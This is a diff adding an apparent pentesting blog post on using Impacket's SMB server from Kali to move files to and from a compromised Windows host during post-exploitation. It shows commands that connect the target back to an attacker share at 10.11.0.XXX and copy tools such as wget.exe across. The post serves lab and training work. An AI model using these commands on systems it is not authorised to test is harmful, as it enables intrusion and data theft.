@@ -1,0 +1,65 @@
+<h2 id="the-power-of-impacket">The power of Impacket</h2>
+
+<p>Often times during a Post-Exploitation phase, the box or an exercise we need to access certain Windows (mostly) machines that <strong>don’t</strong> have internet or any way to transfer a file back to our Kali machine.</p>
+
+<p>There are many other ways and techniques to transfer files (that i’ll cover in another post) but so far this is the most successful one for me, so feel free to use the one that suits you best.</p>
+
+<p>To help with that we have an awesome suite called <a href="https://github.com/fortra/impacket">Impacket</a>.</p>
+
+<blockquote>
+  <p>Impacket is a collection of Python classes for working with network protocols. Impacket is focused on providing low-level programmatic access to the packets and for some protocols (e.g. SMB1-3 and MSRPC) the protocol implementation itself. Packets can be constructed from scratch, as well as parsed from raw data, and the object-oriented API makes it simple to work with deep hierarchies of protocols. The library provides a set of tools as examples of what can be done within the context of this library.</p>
+</blockquote>
+
+<p>There’s no need for installation since it’s already include in Kali.</p>
+
+<h2 id="creating-a-smb-server">Creating a SMB server:</h2>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~# impacket-smbserver share /path/you/want <span class="nt">--smb2support</span>
+</code></pre></div></div>
+
+<p>We use <em>–smbsupport</em> because sometimes gives you an error for SMB1.</p>
+
+<p>Example:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~# impacket-smbserver anakin /home/kali/offsec/tools <span class="nt">-smb2support</span>
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> User OFFICE<span class="se">\o</span>ffsec authenticated successfully
+</code></pre></div></div>
+
+<h2 id="connecting-to-our-share">Connecting to our share</h2>
+
+<p>Once the server is estabilished, we go over to the Windows machine and connect back to our share like this:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\&gt;</span>net use <span class="se">\\</span>10.11.0.XXX<span class="se">\a</span>nakin 
+The <span class="nb">command </span>completed successfully.
+</code></pre></div></div>
+
+<h2 id="transfering-files">Transfering files</h2>
+
+<p>To transfer files just use the command copy. It works both ways.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\&gt;</span>copy <span class="se">\\</span>10.11.0.XXX<span class="se">\a</span>nakin<span class="se">\w</span>get.exe <span class="se">\u</span>sers<span class="se">\o</span>ffsec<span class="se">\d</span>esktop<span class="se">\w</span>get.exe
+1 file<span class="o">(</span>s<span class="o">)</span> copied.
+</code></pre></div></div>
+
+<h2 id="creating-a-shareddrive-folder">Creating a shared/drive folder</h2>
+
+<p>We also can use the option <code class="language-plaintext highlighter-rouge">p:</code> to create a drive folder which we can have access to. Like this you can drag and drop anything you want inside the shared folder.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\&gt;</span>net use p: <span class="se">\\</span>10.11.0.XXX<span class="se">\a</span>nakin 
+The <span class="nb">command </span>completed successfully.
+</code></pre></div></div>
+
+<blockquote>
+  <p>This is very bad for OPSEC, it’s not recommended. If you do, consider disconnecting from the driver using the following: <code class="language-plaintext highlighter-rouge">C:\&gt;net use /d \\[host]\[share name]</code></p>
+</blockquote>
+
+<p>And that’s pretty much it! Very quick and simple.</p>
+
+<p><br />
+<strong>Happy hacking!</strong></p>
+
+<p><img src="/assets/img/smb/kamusari.png" alt="kamusari" /></p>
